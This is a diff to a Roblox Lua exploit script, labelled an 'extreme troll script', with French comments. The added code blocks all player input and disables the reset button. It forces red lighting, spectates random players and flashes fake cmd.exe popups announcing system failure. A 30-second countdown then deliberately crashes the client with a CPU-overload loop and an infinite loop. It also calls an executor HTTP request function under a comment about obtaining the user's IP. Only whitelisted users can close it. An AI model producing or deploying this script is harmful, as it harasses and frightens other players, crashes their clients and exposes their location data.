@@ -1,4 +1,4 @@
--- 💀 EXTREME TROLL SCRIPT + WHITELIST + Countdown + Crash + IP/Loc display 💀
+-- 💀 EXTREME TROLL SCRIPT + WHITELIST + Brutal Crash + Close stop tout + reset cam & lumière + Fake CMD popup 💀
 
 -- Config
 local WHITELIST = {
@@ -15,6 +15,9 @@ local Camera = workspace.CurrentCamera
 local RunService = game:GetService("RunService")
 
 local player = Players.LocalPlayer
+
+-- Variables contrôle
+local running = true
 
 -- 🌐 Obtenir IP de l'utilisateur
 local req = (http_request or request or syn and syn.request)
@@ -72,8 +75,9 @@ sound.Looped = true
 sound:Play()
 
 -- 🔥 Ambiance rouge sang et noir (pour tous)
-spawn(function()
-	while true do
+local lightingThread
+lightingThread = coroutine.create(function()
+	while running do
 		Lighting.Ambient = Color3.fromRGB(255, 0, 0)
 		Lighting.OutdoorAmbient = Color3.fromRGB(255, 0, 0)
 		Lighting.FogColor = Color3.fromRGB(80, 0, 0)
@@ -84,16 +88,19 @@ spawn(function()
 		wait(0.2)
 	end
 end)
+coroutine.resume(lightingThread)
 
 -- 🛑 Bloquer toute interaction (pour tous)
-UIS.InputBegan:Connect(function() return Enum.ContextActionResult.Sink end)
-UIS.InputEnded:Connect(function() return Enum.ContextActionResult.Sink end)
+local function blockInput() return Enum.ContextActionResult.Sink end
+UIS.InputBegan:Connect(blockInput)
+UIS.InputEnded:Connect(blockInput)
 StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
 
 -- 👁️ Spectate joueurs random (pour tous)
-spawn(function()
-	while true do
+local spectateThread
+spectateThread = coroutine.create(function()
+	while running do
 		wait(1)
 		local allPlayers = Players:GetPlayers()
 		if #allPlayers > 1 then
@@ -107,8 +114,91 @@ spawn(function()
 		end
 	end
 end)
+coroutine.resume(spectateThread)
 
--- 🔓 Si whitelisté : bouton pour fermer
+-- Fonction pour créer un faux popup CMD
+local function createFakeCMD()
+	if not running then return end
+
+	local cmdGui = Instance.new("ScreenGui", game.CoreGui)
+	cmdGui.Name = "FakeCMDPopup"
+
+	local frame = Instance.new("Frame", cmdGui)
+	frame.Size = UDim2.new(0, 500, 0, 300)
+	frame.Position = UDim2.new(math.random()*0.7, 0, math.random()*0.7, 0)
+	frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	frame.BorderColor3 = Color3.fromRGB(0, 255, 0)
+	frame.BorderSizePixel = 3
+
+	local titleBar = Instance.new("TextLabel", frame)
+	titleBar.Size = UDim2.new(1, 0, 0, 25)
+	titleBar.BackgroundColor3 = Color3.fromRGB(0, 120, 0)
+	titleBar.Text = "C:\\Windows\\System32\\cmd.exe"
+	titleBar.TextColor3 = Color3.fromRGB(255, 255, 255)
+	titleBar.Font = Enum.Font.SourceSansBold
+	titleBar.TextSize = 18
+	titleBar.TextXAlignment = Enum.TextXAlignment.Left
+	titleBar.BackgroundTransparency = 0
+
+	local textBox = Instance.new("TextLabel", frame)
+	textBox.Size = UDim2.new(1, -10, 1, -35)
+	textBox.Position = UDim2.new(0, 5, 0, 30)
+	textBox.BackgroundTransparency = 1
+	textBox.TextColor3 = Color3.fromRGB(0, 255, 0)
+	textBox.Font = Enum.Font.Code
+	textBox.TextSize = 16
+	textBox.TextXAlignment = Enum.TextXAlignment.Left
+	textBox.TextYAlignment = Enum.TextYAlignment.Top
+
+	-- Texte bidon qui "clignote" façon cmd
+	local messages = {
+		"Starting system check...",
+		"Error: Critical failure detected!",
+		"Attempting to repair...",
+		"Repair failed. System unstable.",
+		"Warning: Memory leak detected.",
+		"System crash imminent...",
+	}
+
+	local index = 1
+	local visible = true
+
+	local blinkConnection
+	blinkConnection = RunService.Heartbeat:Connect(function(dt)
+		if not running then
+			blinkConnection:Disconnect()
+			cmdGui:Destroy()
+			return
+		end
+		visible = not visible
+		textBox.Text = visible and messages[index] or ""
+	end)
+
+	-- Changer message toutes les 0.8 sec
+	spawn(function()
+		while running do
+			wait(0.8)
+			index = (index % #messages) + 1
+		end
+	end)
+
+	-- Supprimer popup après 1.5 sec
+	delay(0.5, function()
+		if cmdGui and cmdGui.Parent then
+			cmdGui:Destroy()
+		end
+	end)
+end
+
+-- Spawn le popup fake cmd toutes les 2 à 4 secondes aléatoires
+spawn(function()
+	while running do
+		createFakeCMD()
+		wait(2 + math.random()*2)
+	end
+end)
+
+-- 🔓 Si whitelisté : bouton pour fermer qui stop tout + reset lumière et caméra
 if isWhitelisted then
     local close = Instance.new("TextButton", frame)
     close.Size = UDim2.new(0.3, 0, 0.2, 0)
@@ -118,20 +208,68 @@ if isWhitelisted then
     close.TextColor3 = Color3.fromRGB(255, 255, 255)
     close.TextScaled = true
     close.MouseButton1Click:Connect(function()
+        running = false -- stop threads
+
         gui:Destroy()
-        if game.Workspace:FindFirstChild("Sound") then
-            game.Workspace.Sound:Destroy()
+
+        if sound and sound.Parent then
+            sound:Stop()
+            sound:Destroy()
         end
+
+        -- Reset lighting à l’état normal
+        Lighting.Ambient = Color3.fromRGB(127, 127, 127)
+        Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
+        Lighting.FogColor = Color3.fromRGB(255, 255, 255)
+        Lighting.FogEnd = 100000
+
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+        pcall(function() StarterGui:SetCore("ResetButtonCallback", true) end)
+
+        -- Reset caméra sur le joueur
+        local character = player.Character
+        if character then
+            local humanoid = character:FindFirstChild("Humanoid")
+            if humanoid then
+                Camera.CameraSubject = humanoid
+                Camera.CameraType = Enum.CameraType.Custom
+            else
+                Camera.CameraSubject = character
+                Camera.CameraType = Enum.CameraType.Custom
+            end
+        else
+            Camera.CameraSubject = player
+            Camera.CameraType = Enum.CameraType.Custom
+        end
+
         script:Destroy()
     end)
 end
 
--- ⏳ Compte à rebours 30 secondes puis crash
+-- ⏳ Compte à rebours 30 secondes puis CRASH BRUTAL
 spawn(function()
     for i = 30, 1, -1 do
+        if not running then return end
         countdownText.Text = "Crash dans : " .. i .. " secondes"
         wait(1)
     end
-    -- Crash Roblox : boucle infinie bloquante
+
+    if not running then return end
+
+    -- Crash brutal: surcharge CPU avec RenderStepped + boucle infinie
+    local function heavyLoad()
+        local a = 0
+        for i = 1, 1e7 do
+            a = a + math.sqrt(i) * math.sin(i)
+        end
+    end
+
+    RunService.RenderStepped:Connect(function()
+        if running then
+            heavyLoad()
+        end
+    end)
+
+    -- Boucle infinie bloquante (garantie crash)
     while true do end
 end)
